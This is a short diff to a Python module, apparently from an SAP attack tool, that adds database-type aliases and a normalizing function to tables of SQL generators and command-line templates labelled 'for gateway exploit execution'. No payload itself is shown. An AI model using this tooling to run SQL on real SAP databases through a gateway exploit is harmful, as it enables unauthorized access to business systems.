@@ -170,26 +170,53 @@ def sql_db2(sid: str, client: str, username: str) -> list:
 
 # Map DB type identifier to SQL generator
 SQL_GENERATORS = {
-    "MSS":  sql_mssql_abap,    # MSSQL
-    "MSSQL": sql_mssql_abap,
-    "ADA":  sql_maxdb,          # MaxDB / SAP DB
-    "MAXDB": sql_maxdb,
-    "HDB":  sql_hana,           # HANA
-    "HANA": sql_hana,
-    "ORA":  sql_oracle,         # Oracle
-    "ORACLE": sql_oracle,
-    "DB6":  sql_db2,            # DB2
-    "DB2":  sql_db2,
+    "MSS":      sql_mssql_abap,    # MSSQL
+    "MSSQL":    sql_mssql_abap,
+    "ADA":      sql_maxdb,          # MaxDB / SAP DB / ADABAS D
+    "MAXDB":    sql_maxdb,
+    "ADABAS":   sql_maxdb,          # "ADABAS D" after normalize
+    "HDB":      sql_hana,           # HANA
+    "HANA":     sql_hana,
+    "ORA":      sql_oracle,         # Oracle
+    "ORACLE":   sql_oracle,
+    "DB6":      sql_db2,            # DB2
+    "DB2":      sql_db2,
 }
 
 # DB CLI command templates (for gateway exploit execution)
 DB_CLI_COMMANDS = {
-    "MSS":    'sqlcmd -S {db_host} -i {sql_file}',
-    "ADA":    'sqlcli -U DEFAULT {sql_statement}',
-    "HDB":    'hdbsql -n {db_host} -i 00 -U DEFAULT -o output.txt -I {sql_file}',
-    "ORA":    'sqlplus -S /NOLOG @{sql_file}',
-    "DB6":    'db2 {sql_statement}',
+    "MSS":      'sqlcmd -S {db_host} -i {sql_file}',
+    "ADA":      'sqlcli -U DEFAULT {sql_statement}',
+    "MAXDB":    'sqlcli -U DEFAULT {sql_statement}',
+    "ADABAS":   'sqlcli -U DEFAULT {sql_statement}',
+    "HDB":      'hdbsql -n {db_host} -i 00 -U DEFAULT -o output.txt -I {sql_file}',
+    "ORA":      'sqlplus -S /NOLOG @{sql_file}',
+    "DB6":      'db2 {sql_statement}',
 }
+
+
+def normalize_db_type(db_type_raw: str) -> str:
+    """Normalize a database type string to a canonical key for SQL_GENERATORS.
+
+    Handles variants like "ADABAS D", "MaxDB", "HDB", "HANA", etc.
+    Returns the uppercase canonical key or the cleaned input if unknown.
+    """
+    dt = db_type_raw.strip().upper()
+    # Direct match first
+    if dt in SQL_GENERATORS:
+        return dt
+    # Known aliases / substrings
+    if "ADABAS" in dt or "MAXDB" in dt or "ADA" in dt:
+        return "ADA"
+    if "HDB" in dt or "HANA" in dt:
+        return "HDB"
+    if "MSS" in dt or "MSSQL" in dt or "MICROSOFT" in dt:
+        return "MSS"
+    if "ORA" in dt or "ORACLE" in dt:
+        return "ORA"
+    if "DB2" in dt or "DB6" in dt:
+        return "DB6"
+    return dt
 
 
 # ---------------------------------------------------------------------------
